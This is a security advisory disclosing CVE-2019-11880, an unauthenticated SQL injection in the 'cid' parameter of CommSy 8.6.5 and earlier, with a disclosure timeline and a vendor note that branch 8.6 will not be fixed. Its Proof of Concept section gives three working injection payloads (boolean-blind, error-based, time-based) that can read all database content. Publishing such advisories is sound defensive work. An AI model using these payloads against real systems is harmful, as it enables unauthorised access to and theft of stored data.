@@ -1,0 +1,56 @@
+Title:
+======
+CommSy 8.6.5 - SQL injection
+
+Researcher:
+===========
+Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG
+
+CVE-ID:
+=======
+CVE-2019-11880
+
+Timeline:
+=========
+2019-04-15 Vulnerability discovered
+2019-04-15 Asked for security contact and PGP key
+2019-04-16 Send details to the vendor
+2019-05-07 Flaw was approved but will not be fixed in branch 8.6
+2019-05-15 Public disclosure
+
+Affected Products:
+==================
+CommSy <= 8.6.5
+
+Vendor Homepage:
+================
+https://www.commsy.net
+
+Details:
+========
+CommSy is a web-based community system, originally developed at the
+University of Hamburg, Germany, to support learning/working communities.
+We have discovered a unauthenticated SQL injection vulnerability in
+CommSy <= 8.6.5 that makes it possible to read all database content. The
+vulnerability exists in the HTTP GET parameter "cid".
+
+Proof of Concept:
+=================
+boolean-based blind:
+commsy.php?cid=101" AND 3823=(SELECT (CASE WHEN (3823=3823) THEN 3823
+ELSE (SELECT 7548 UNION SELECT 4498) END))-- dGRD&mod=context&fct=login
+
+error-based:
+commsy.php?cid=101" AND (SELECT 6105 FROM(SELECT
+COUNT(*),CONCAT(0x716a767871,(SELECT
+(ELT(6105=6105,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jzQs&mod=context&fct=login
+
+time-based blind:
+commsy.php?cid=101" AND SLEEP(5)-- MjJM&mod=context&fct=login
+
+Fix:
+====
+According to the manufacturer, the version branch 8.6 is no longer
+supported and the vulnerability will not be fixed. Customers should
+update to the newest version 9.2.
